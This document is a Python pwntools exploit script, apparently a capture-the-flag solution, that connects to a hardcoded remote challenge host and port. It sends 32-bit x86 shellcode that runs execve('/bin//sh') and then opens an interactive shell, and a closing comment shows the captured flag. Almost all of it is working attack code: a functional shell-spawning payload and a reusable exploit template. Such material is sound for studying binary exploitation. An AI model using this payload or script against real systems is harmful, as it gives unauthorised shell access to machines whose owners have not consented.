#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10243)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

shellcode = (
    b"\x31\xc0"              # xor    eax,eax
    b"\x50"                  # push   eax
    b"\x68\x2f\x2f\x73\x68"  # push   '//sh'
    b"\x68\x2f\x62\x69\x6e"  # push   '/bin'
    b"\x89\xe3"              # mov    ebx,esp
    b"\x50"                  # push   eax
    b"\x53"                  # push   ebx
    b"\x89\xe1"              # mov    ecx,esp
    b"\x99"                  # cdq
    b"\xb0\x0b"              # mov    al,0xb
    b"\xcd\x80"              # int    0x80
)

io = start()
io.clean()
io.sendline(shellcode)
io.interactive()

# OUTPUT : HZ2018{r3@L_sh3ll_c0de_9ee31df2f932ad01}